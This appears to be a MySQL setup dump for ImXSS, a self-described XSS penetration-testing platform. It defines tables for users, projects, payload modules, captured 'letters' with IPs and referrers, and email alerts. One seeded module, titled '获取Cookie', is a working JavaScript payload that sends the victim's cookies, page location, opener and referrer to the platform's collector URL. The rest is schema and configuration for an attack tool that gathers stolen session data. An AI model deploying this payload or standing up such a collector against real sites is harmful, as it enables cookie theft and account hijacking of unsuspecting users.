/*
Navicat MySQL Data Transfer

Source Server         : etrick
Source Server Version : 50719
Source Host           : etrick.org:52014
Source Database       : idreader-general

Target Server Type    : MYSQL
Target Server Version : 50719
File Encoding         : 65001

Date: 2017-10-14 23:13:32
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for address_info
-- ----------------------------
DROP TABLE IF EXISTS `address_info`;
CREATE TABLE `address_info` (
  `ip` varchar(32) NOT NULL,
  `country` varchar(64) DEFAULT NULL,
  `area` varchar(64) DEFAULT NULL,
  `region` varchar(64) DEFAULT NULL,
  `city` varchar(64) DEFAULT NULL,
  `isp` varchar(64) DEFAULT NULL,
  PRIMARY KEY (`ip`)
) ENGINE=InnoDB ;

-- ----------------------------
-- Records of address_info
-- ----------------------------

-- ----------------------------
-- Table structure for email_send_census
-- ----------------------------
DROP TABLE IF EXISTS `email_send_census`;
CREATE TABLE `email_send_census`  (
  `userId` int(11) NOT NULL,
  `day` varchar(14) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `num` int(11) NULL DEFAULT 0,
  PRIMARY KEY (`userId`, `day`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=41  ;

-- ----------------------------
-- Table structure for email_info
-- ----------------------------
DROP TABLE IF EXISTS `email_info`;
CREATE TABLE `email_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `smtp` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `email` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `password` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `sendNum` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=41  ;

-- ----------------------------
-- Records of email_info
-- ----------------------------

-- ----------------------------
-- Table structure for email_queue
-- ----------------------------
DROP TABLE IF EXISTS `email_queue`;
CREATE TABLE `email_queue` (
  `id` bigint(32) NOT NULL AUTO_INCREMENT,
  `unionId` varchar(32) NOT NULL,
  `title` varchar(255) DEFAULT NULL,
  `context` varchar(2048) DEFAULT NULL,
  `targeEmail` varchar(32) DEFAULT NULL,
  `sendEmail` varchar(32) DEFAULT NULL,
  `status` int(11) DEFAULT '0',
  `createTime` datetime DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  `millisecond` bigint(32) DEFAULT NULL,
  `updateTime` datetime DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=InnoDB ;

-- ----------------------------
-- Records of email_queue
-- ----------------------------

-- ----------------------------
-- Table structure for email_record
-- ----------------------------
DROP TABLE IF EXISTS `email_record`;
CREATE TABLE `email_record`  (
  `email` varchar(28) NOT NULL,
  `day` varchar(14)  NOT NULL,
  `sended` int(11) NULL DEFAULT 0,
  `createTime` datetime(0) NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`email`, `day`) USING BTREE
) ENGINE = InnoDB ;

-- ----------------------------
-- Table structure for invite_info
-- ----------------------------
DROP TABLE IF EXISTS `invite_info`;
CREATE TABLE `invite_info` (
  `inviteCode` varchar(32) COLLATE utf8_bin NOT NULL,
  `userId` int(11) DEFAULT NULL,
  `status` int(1) DEFAULT '0',
  `updateTime` datetime DEFAULT NULL,
  PRIMARY KEY (`inviteCode`),
  KEY `invite_user_id_fk` (`userId`),
  KEY `invite_code_index` (`inviteCode`)
) ENGINE=InnoDB  ;

-- ----------------------------
-- Records of invite_info
-- ----------------------------

-- ----------------------------
-- Table structure for letter_info
-- ----------------------------
DROP TABLE IF EXISTS `letter_info`;
CREATE TABLE `letter_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `projectId` int(11) DEFAULT NULL,
  `refUrl` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `updateTime` datetime DEFAULT NULL,
  `unionId` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `ip` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `userId` int(11) NOT NULL,
  `isReaded` int(1) DEFAULT '0',
  `moduleId` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `letter_unionId_index` (`unionId`) USING BTREE,
  KEY `letter_project_id_fk` (`projectId`) USING BTREE,
  KEY `letter_userId_index` (`userId`),
  FULLTEXT KEY `letter_refurl_index` (`refUrl`)
) ENGINE=InnoDB AUTO_INCREMENT=6031  ;

-- ----------------------------
-- Records of letter_info
-- ----------------------------

-- ----------------------------
-- Table structure for letter_paras
-- ----------------------------
DROP TABLE IF EXISTS `letter_paras`;
CREATE TABLE `letter_paras` (
  `paraName` varchar(255) COLLATE utf8_bin NOT NULL,
  `letterId` int(11) NOT NULL,
  `paraValue` text COLLATE utf8_bin,
  `updateTime` datetime DEFAULT NULL,
  PRIMARY KEY (`paraName`,`letterId`),
  KEY `paras_letter_id` (`letterId`)
) ENGINE=InnoDB  ;

-- ----------------------------
-- Records of letter_paras
-- ----------------------------

-- ----------------------------
-- Table structure for module_info
-- ----------------------------
DROP TABLE IF EXISTS `module_info`;
CREATE TABLE `module_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userId` int(11) DEFAULT NULL,
  `remark` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `content` text COLLATE utf8_bin,
  `type` int(11) DEFAULT '0',
  `updateTime` datetime DEFAULT NULL,
  `title` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `module_id_index` (`id`),
  KEY `module_type_index` (`type`),
  KEY `module_all_index` (`userId`,`type`)
) ENGINE=InnoDB AUTO_INCREMENT=80  ;

-- ----------------------------
-- Records of module_info
-- ----------------------------
INSERT INTO `module_info` VALUES (37, 0, '获取Cookie', 'var x = new Image();\r\ntry {\r\n	var myopener = \'\';\r\n	myopener = window.opener && window.opener.location ? window.opener.location			: \'\';\r\n} catch (err) {\r\n}\r\nmyopener =(myopener ==null)?\"\":myopener ;\r\nx.src = \'{api}?location=\'\r\n		+ escape(document.location) + \'&toplocation=\'\r\n		+ escape(top.document.location) + \'&cookie=\' + escape(document.cookie)\r\n		+ \'&opener=\' + escape(myopener) + \'&referrer=\'\r\n		+ escape(document.referrer);', 1, '2017-07-14 08:32:33', '获取Cookie');

-- ----------------------------
-- Table structure for project_info
-- ----------------------------
DROP TABLE IF EXISTS `project_info`;
CREATE TABLE `project_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `moduleId` int(11) DEFAULT NULL,
  `userId` int(11) DEFAULT NULL,
  `title` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `remark` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `updateTime` datetime DEFAULT NULL,
  `uri` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `sortUri` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `openMobile` int(1) DEFAULT '0',
  `openEmail` int(1) DEFAULT '0',
  `ignoreRef` varchar(2048) COLLATE utf8_bin DEFAULT NULL,
  `ignoreIp` varchar(2048) COLLATE utf8_bin DEFAULT NULL,
  `isOpen` int(1) DEFAULT '1',
  PRIMARY KEY (`id`),
  KEY `project_module_id_fk` (`moduleId`) USING BTREE,
  KEY `project_user_id_fk` (`userId`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=370  ;

-- ----------------------------
-- Records of project_info
-- ----------------------------

-- ----------------------------
-- Table structure for project_module_mapping
-- ----------------------------
DROP TABLE IF EXISTS `project_module_mapping`;
CREATE TABLE `project_module_mapping` (
  `projectId` int(11) NOT NULL,
  `moduleId` int(11) NOT NULL,
  `mapping` varchar(255) COLLATE utf8_bin NOT NULL,
  `userId` int(11) NOT NULL,
  `id` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `type` int(1) DEFAULT 1,
  PRIMARY KEY (`mapping`,`projectId`),
  UNIQUE KEY `mapping_id_index` (`id`) USING BTREE,
  KEY `mapping_index` (`mapping`),
  KEY `mapping_user_index` (`mapping`,`userId`),
  KEY `mapping_user_project_index` (`projectId`,`mapping`,`userId`)
) ENGINE=InnoDB  ;

-- ----------------------------
-- Records of project_module_mapping
-- ----------------------------

-- ----------------------------
-- Table structure for setting_info
-- ----------------------------
DROP TABLE IF EXISTS `setting_info`;
CREATE TABLE `setting_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `siteName` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `keywords` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `description` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `copyright` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `openReg` int(1) DEFAULT '1' COMMENT '0未开启 1开启',
  `needInvite` int(1) DEFAULT '0' COMMENT '0不需要 1需要',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2  ;

-- ----------------------------
-- Records of setting_info
-- ----------------------------
INSERT INTO `setting_info` VALUES ('1', 'ImXSS 国内最专业的Xss渗透测试平台', '国内最专业的Xss渗透测试平台  --ImXSS', 'ImXss为etrick研发且开源。是国内最专业的Xss渗透平台', 'Copyright © 2014-2019 Scrum Group 版权所有', '1', '0');

-- ----------------------------
-- Table structure for suffix_info
-- ----------------------------
DROP TABLE IF EXISTS `suffix_info`;
CREATE TABLE `suffix_info` (
  `suffix` varchar(255) NOT NULL,
  `status` int(1) DEFAULT NULL,
  PRIMARY KEY (`suffix`)
) ENGINE=InnoDB ;

-- ----------------------------
-- Records of suffix_info
-- ----------------------------
INSERT INTO `suffix_info` VALUES ('action', '0');
INSERT INTO `suffix_info` VALUES ('admin', '0');
INSERT INTO `suffix_info` VALUES ('asa', '0');
INSERT INTO `suffix_info` VALUES ('asax', '0');
INSERT INTO `suffix_info` VALUES ('ascx', '0');
INSERT INTO `suffix_info` VALUES ('ashx', '0');
INSERT INTO `suffix_info` VALUES ('asp', '0');
INSERT INTO `suffix_info` VALUES ('aspx', '0');
INSERT INTO `suffix_info` VALUES ('bat', '0');
INSERT INTO `suffix_info` VALUES ('cer', '0');
INSERT INTO `suffix_info` VALUES ('cgi', '0');
INSERT INTO `suffix_info` VALUES ('cgix', '0');
INSERT INTO `suffix_info` VALUES ('cmd', '0');
INSERT INTO `suffix_info` VALUES ('com', '0');
INSERT INTO `suffix_info` VALUES ('csp', '0');
INSERT INTO `suffix_info` VALUES ('csrf', '0');
INSERT INTO `suffix_info` VALUES ('cssx', '0');
INSERT INTO `suffix_info` VALUES ('do', '0');
INSERT INTO `suffix_info` VALUES ('edu', '0');
INSERT INTO `suffix_info` VALUES ('esp', '2');
INSERT INTO `suffix_info` VALUES ('exe', '0');
INSERT INTO `suffix_info` VALUES ('exec', '0');
INSERT INTO `suffix_info` VALUES ('exp', '0');
INSERT INTO `suffix_info` VALUES ('fsp', '0');
INSERT INTO `suffix_info` VALUES ('ftl', '0');
INSERT INTO `suffix_info` VALUES ('gifx', '0');
INSERT INTO `suffix_info` VALUES ('gov', '0');
INSERT INTO `suffix_info` VALUES ('htm', '0');
INSERT INTO `suffix_info` VALUES ('html', '0');
INSERT INTO `suffix_info` VALUES ('iis', '0');
INSERT INTO `suffix_info` VALUES ('jhtml', '0');
INSERT INTO `suffix_info` VALUES ('jpgx', '0');
INSERT INTO `suffix_info` VALUES ('jshx', '0');
INSERT INTO `suffix_info` VALUES ('jspx', '0');
INSERT INTO `suffix_info` VALUES ('jsx', '0');
INSERT INTO `suffix_info` VALUES ('mspx', '0');
INSERT INTO `suffix_info` VALUES ('org', '0');
INSERT INTO `suffix_info` VALUES ('php', '0');
INSERT INTO `suffix_info` VALUES ('phpx', '0');
INSERT INTO `suffix_info` VALUES ('pngx', '0');
INSERT INTO `suffix_info` VALUES ('psp', '0');
INSERT INTO `suffix_info` VALUES ('py', '0');
INSERT INTO `suffix_info` VALUES ('sb', '0');
INSERT INTO `suffix_info` VALUES ('ser', '0');
INSERT INTO `suffix_info` VALUES ('shell', '0');
INSERT INTO `suffix_info` VALUES ('shtml', '0');
INSERT INTO `suffix_info` VALUES ('sos', '0');
INSERT INTO `suffix_info` VALUES ('swf', '0');
INSERT INTO `suffix_info` VALUES ('tmp', '0');
INSERT INTO `suffix_info` VALUES ('txt', '0');
INSERT INTO `suffix_info` VALUES ('vbe', '0');
INSERT INTO `suffix_info` VALUES ('vbs', '0');
INSERT INTO `suffix_info` VALUES ('xhtml', '0');
INSERT INTO `suffix_info` VALUES ('xml', '0');
INSERT INTO `suffix_info` VALUES ('xsp', '0');
INSERT INTO `suffix_info` VALUES ('xss', '0');

-- ----------------------------
-- Table structure for suffix_static
-- ----------------------------
DROP TABLE IF EXISTS `suffix_static`;
CREATE TABLE `suffix_static` (
  `id` int(8) NOT NULL AUTO_INCREMENT,
  `suffix` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=26 ;

-- ----------------------------
-- Records of suffix_static
-- ----------------------------
INSERT INTO `suffix_static` VALUES ('1', 'css');
INSERT INTO `suffix_static` VALUES ('2', 'js');
INSERT INTO `suffix_static` VALUES ('3', 'jpg');
INSERT INTO `suffix_static` VALUES ('4', 'gif');
INSERT INTO `suffix_static` VALUES ('5', 'bmp');
INSERT INTO `suffix_static` VALUES ('6', 'ico');
INSERT INTO `suffix_static` VALUES ('7', 'txt');
INSERT INTO `suffix_static` VALUES ('8', 'exe');
INSERT INTO `suffix_static` VALUES ('9', 'zip');
INSERT INTO `suffix_static` VALUES ('10', 'rar');
INSERT INTO `suffix_static` VALUES ('11', '7z');
INSERT INTO `suffix_static` VALUES ('12', 'jpeg');
INSERT INTO `suffix_static` VALUES ('13', 'png');
INSERT INTO `suffix_static` VALUES ('14', 'doc');
INSERT INTO `suffix_static` VALUES ('15', 'ppt');
INSERT INTO `suffix_static` VALUES ('16', 'avi');
INSERT INTO `suffix_static` VALUES ('17', 'mp4');
INSERT INTO `suffix_static` VALUES ('18', 'rmvb');
INSERT INTO `suffix_static` VALUES ('19', 'flv');
INSERT INTO `suffix_static` VALUES ('20', 'woff');
INSERT INTO `suffix_static` VALUES ('21', 'woff2');
INSERT INTO `suffix_static` VALUES ('22', 'eot');
INSERT INTO `suffix_static` VALUES ('23', 'svg');
INSERT INTO `suffix_static` VALUES ('24', 'ttf');
INSERT INTO `suffix_static` VALUES ('25', 'otf');

-- ----------------------------
-- Table structure for sys_menus
-- ----------------------------
DROP TABLE IF EXISTS `sys_menus`;
CREATE TABLE `sys_menus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(64) DEFAULT NULL,
  `url` varchar(255) DEFAULT NULL,
  `type` int(1) DEFAULT '0',
  `upId` int(11) DEFAULT NULL,
  `seq` int(11) DEFAULT NULL,
  `code` varchar(128) DEFAULT NULL,
  `remark` varchar(1024) DEFAULT NULL,
  `groupName` varchar(64) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `menu_upId_fk` (`upId`),
  CONSTRAINT `menu_upId_fk` FOREIGN KEY (`upId`) REFERENCES `sys_menus` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=67 ;

-- ----------------------------
-- Records of sys_menus
-- ----------------------------
INSERT INTO `sys_menus` VALUES ('4', '调试中心', '#', '0', null, '4', null, null, '管理员功能');
INSERT INTO `sys_menus` VALUES ('28', '运行状态', 'admin/simple/index', '1', '4', '1', 'index', '后台管理首页', '管理员功能');
INSERT INTO `sys_menus` VALUES ('29', '资源管理', 'admin/simple/resources', '1', '4', '1', 'resources', '对项目文件进行管理', '管理员功能');
INSERT INTO `sys_menus` VALUES ('30', '监听管理', 'admin/simple/monitorList', '1', '4', '2', 'monitorSetting', '对项目方法进行监听', '管理员功能');
INSERT INTO `sys_menus` VALUES ('32', '缓存管理', 'admin/simple/cacheManage', '1', '4', '4', 'cacheSetting', '对系统缓存进行清理', '管理员功能');
INSERT INTO `sys_menus` VALUES ('48', '用户中心', '#', '0', null, '0', '', '会员中心相关管理', '用户功能');
INSERT INTO `sys_menus` VALUES ('49', '个人设置', 'user/userSetting', '1', '48', '0', 'userSetting', '用户资料修改', '用户功能');
INSERT INTO `sys_menus` VALUES ('50', '信封管理', 'user/letter/letterCenter', '1', '48', '1', 'letterCenter', '信封管理', '用户功能');
INSERT INTO `sys_menus` VALUES ('51', '项目管理', 'user/project/projectCenter', '1', '48', '2', 'projectCenter', '项目管理', '用户功能');
INSERT INTO `sys_menus` VALUES ('52', '模块管理', 'user/module/moduleCenter', '1', '48', '3', 'moduleCenter', '模块管理', '用户功能');
INSERT INTO `sys_menus` VALUES ('53', '公共邮箱', 'user/email/emailCenter', '1', '54', '1', 'emailCenter', '系统公用发信邮箱', '用户功能');
INSERT INTO `sys_menus` VALUES ('54', '公共信息', '#', '0', null, '0', null, null, '用户功能');
INSERT INTO `sys_menus` VALUES ('55', '公共模块', 'user/module/moduleComm', '1', '54', '3', 'moduleComm', '系统公用模块', '用户功能');
INSERT INTO `sys_menus` VALUES ('57', '用户管理', 'admin/user/userManage', '1', '66', '3', 'userManage', '用户管理', '管理员功能');
INSERT INTO `sys_menus` VALUES ('58', '项目管理', 'admin/project/projectManage', '1', '66', '4', 'projectManage', '项目管理', '管理员功能');
INSERT INTO `sys_menus` VALUES ('59', '模块管理', 'admin/module/moduleManage', '1', '66', '5', 'moduleManage', '模块管理', '管理员功能');
INSERT INTO `sys_menus` VALUES ('60', '信封管理', 'admin/letter/letterManage', '1', '66', '6', 'letterManage', '信封管理', '管理员功能');
INSERT INTO `sys_menus` VALUES ('61', '邀请码库', 'admin/invite/inviteManage', '1', '65', '2', 'inviteManage', '邀请码管理', '管理员功能');
INSERT INTO `sys_menus` VALUES ('62', '系统设置', 'admin/setting/settingManage', '1', '65', '0', 'settingManage', '系统设置', '管理员功能');
INSERT INTO `sys_menus` VALUES ('63', '邮箱设置', 'admin/email/emailManage', '1', '65', '0', 'emailManage', '模块管理', '管理员功能');
INSERT INTO `sys_menus` VALUES ('64', '后缀设置', 'admin/suffix/suffixManage', '1', '65', '1', 'suffixManage', '后缀设置', '管理员功能');
INSERT INTO `sys_menus` VALUES ('65', '系统设置', '#', '0', null, '2', null, null, '管理员功能');
INSERT INTO `sys_menus` VALUES ('66', '内容管理', '#', '0', null, '3', null, null, '管理员功能');

-- ----------------------------
-- Table structure for user_info
-- ----------------------------
DROP TABLE IF EXISTS `user_info`;
CREATE TABLE `user_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userPwd` varchar(40) COLLATE utf8_bin DEFAULT NULL,
  `mobile` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `email` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `createTime` datetime DEFAULT NULL,
  `status` int(1) NOT NULL DEFAULT '0',
  `roleId` int(11) NOT NULL DEFAULT '0',
  `logo` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `nickName` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `smtp` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `sendEmail` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `sendPwd` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_mobile_index` (`mobile`) USING BTREE,
  UNIQUE KEY `user_email_index` (`email`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=768  ;

-- ----------------------------
-- Records of user_info
-- ----------------------------

-- ----------------------------
-- Table structure for user_role
-- ----------------------------
DROP TABLE IF EXISTS `user_role`;
CREATE TABLE `user_role` (
  `id` int(11) NOT NULL,
  `name` varchar(64) DEFAULT NULL,
  `menus` varchar(1024) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB ;

-- ----------------------------
-- Records of user_role
-- ----------------------------
INSERT INTO `user_role` VALUES ('0', '会员', '48,49,50,51,52,53,55,54');
INSERT INTO `user_role` VALUES ('1', '管理员', '4,28,29,30,32,48,49,50,51,52,53,55,54,57,58,59,60,61,62,64,63,65,66');
